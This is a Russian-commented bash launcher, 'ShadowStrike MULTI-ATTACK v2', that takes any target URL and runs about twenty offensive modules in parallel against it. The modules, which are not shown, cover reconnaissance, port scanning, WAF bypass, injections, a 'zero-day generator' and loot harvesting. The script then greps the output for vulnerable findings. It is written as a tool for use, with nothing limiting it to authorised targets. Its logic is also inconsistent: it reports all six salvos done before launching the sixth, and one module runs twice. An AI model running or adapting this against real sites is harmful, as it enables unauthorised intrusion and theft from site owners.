#!/bin/bash
# MULTI-ATTACK v2 — Одновременная атака лучшими модулями
# Использует легендарные и ультра-легендарные техники

TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 http://target.com" && exit 1

DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
SERVER_IP=$(dig +short "$DOMAIN" 2>/dev/null | head -1)
LOOT="$HOME/shadow_multi_loot_$(date +%H%M)"
mkdir -p "$LOOT"

echo "╔══════════════════════════════════════════════╗"
echo "║   ShadowStrike — MULTI-ATTACK v2            ║"
echo "║   Все лучшие атаки одновременно             ║"
echo "╚══════════════════════════════════════════════╝"
echo ""
echo "[MULTI] Цель: $TARGET ($SERVER_IP)"
echo ""

# ⚡ ЗАЛП 1: РАЗВЕДКА (Обычные + Необычные)
echo "[MULTI] ⚡ ЗАЛП 1: РАЗВЕДКА"
~/shadow_deep_recon.sh "$TARGET" > "$LOOT/recon.txt" 2>&1 &
~/shadow_api_fuzzer.sh "$TARGET" > "$LOOT/api.txt" 2>&1 &
~/shadow_portscan_pro.sh "$TARGET" > "$LOOT/ports.txt" 2>&1 &
echo "  🟢 Разведка запущена"

# ⚡ ЗАЛП 2: WAF ОБХОД (Редкие + Эпические)
echo "[MULTI] ⚡ ЗАЛП 2: WAF ОБХОД"
~/shadow_echo_v2.sh "$TARGET" > "$LOOT/waf_detect.txt" 2>&1 &
~/shadow_reverse_psychology_v2.sh "$TARGET" > "$LOOT/psycho.txt" 2>&1 &
~/shadow_reflective_waf_v2.sh "$TARGET" > "$LOOT/reflective.txt" 2>&1 &
echo "  🔵 WAF обход запущен"

# ⚡ ЗАЛП 3: ИНЪЕКЦИИ (Легендарные)
echo "[MULTI] ⚡ ЗАЛП 3: ИНЪЕКЦИИ"
~/shadow_smart_injections.sh "$TARGET" > "$LOOT/injections.txt" 2>&1 &
~/shadow_quantum_fuzz.sh "$TARGET" > "$LOOT/quantum.txt" 2>&1 &
~/shadow_zeroday_gen.sh "$TARGET" > "$LOOT/zeroday.txt" 2>&1 &
echo "  🟠 Инъекции запущены"

# ⚡ ЗАЛП 4: ХАОС (Ультра-легендарные + Хаос)
echo "[MULTI] ⚡ ЗАЛП 4: ХАОС"
~/shadow_inversion.sh "$TARGET" > "$LOOT/inversion.txt" 2>&1 &
~/shadow_entropy.sh "$TARGET" > "$LOOT/entropy.txt" 2>&1 &
~/shadow_apophenia.sh "$TARGET" > "$LOOT/apophenia.txt" 2>&1 &
echo "  ⚫ Хаос запущен"

# ⚡ ЗАЛП 5: ПРОНИКНОВЕНИЕ (Мифические)
echo "[MULTI] ⚡ ЗАЛП 5: ПРОНИКНОВЕНИЕ"
~/shadow_phoenix.sh 2>/dev/null &
~/shadow_recursion.sh "$TARGET" > "$LOOT/recursion.txt" 2>&1 &
~/shadow_ghost_protocol.sh "$TARGET" > "$LOOT/ghost.txt" 2>&1 &
echo "  🟡 Проникновение запущено"

# Ждём завершения всех атак
echo ""
echo "[MULTI] Все 5 залпов запущены. Жду завершения..."
wait

# ⚡ ФИНАЛ: СБОР ДОБЫЧИ
echo ""
echo "[MULTI] ⚡ ФИНАЛ: СБОР ДОБЫЧИ"
~/shadow_void_collector.sh "$TARGET" > "$LOOT/void_loot.txt" 2>&1 &
~/shadow_harvester.sh > "$LOOT/harvest.txt" 2>&1 &
wait

# ИТОГОВЫЙ ОТЧЁТ
echo ""
echo "══════════════════════════════════════════════"
echo "  MULTI-ATTACK v2 ЗАВЕРШЁН"
echo "══════════════════════════════════════════════"
echo ""
echo "  📊 Результаты:"
echo "  Открытых портов: $(grep -c 'open' "$LOOT/ports.txt" 2>/dev/null || echo 0)"
echo "  Инъекций: $(grep -c 'РАБОТАЕТ' "$LOOT/injections.txt" 2>/dev/null || echo 0)"
echo "  WAF: $(grep -c 'WAF\|Cloudflare\|FortiWeb' "$LOOT/waf_detect.txt" 2>/dev/null || echo 0)"
echo "  Zero-Day: $(grep -c 'НОВАЯ' "$LOOT/zeroday.txt" 2>/dev/null || echo 0)"
echo "  Собрано файлов: $(find $LOOT -type f 2>/dev/null | wc -l)"
echo ""
echo "  📁 Лут: $LOOT"
echo ""
echo "  🟢 ВСЕ 6 ЗАЛПОВ ОТРАБОТАНЫ"
echo "  🟢 19+ ЛУЧШИХ МОДУЛЕЙ ЗАДЕЙСТВОВАНО"
echo "══════════════════════════════════════════════"

# Показываем самые важные находки
echo ""
echo "🔴 КРИТИЧЕСКИЕ НАХОДКИ:"
grep -h "🔴\|НОВАЯ\|CRITICAL\|VULNERABLE" "$LOOT"/*.txt 2>/dev/null | head -10

echo ""
echo "[MULTI] Полный отчёт: $LOOT"

# ⚡ ЗАЛП 6: XXX (ЗА ГРАНЬЮ)
echo "[MULTI] ⚡ ЗАЛП 6: XXX — ЗА ГРАНЬЮ"
~/shadow_apophenia.sh "$TARGET" > "$LOOT/apophenia.txt" 2>&1 &
~/shadow_ground_zero.sh "$TARGET" > "$LOOT/ground_zero.txt" 2>&1 &
~/shadow_fermi.sh "$TARGET" > "$LOOT/fermi.txt" 2>&1 &
~/shadow_final_frontier.sh > "$LOOT/frontier.txt" 2>&1 &
echo "  💀 XXX запущен — реальность под вопросом"
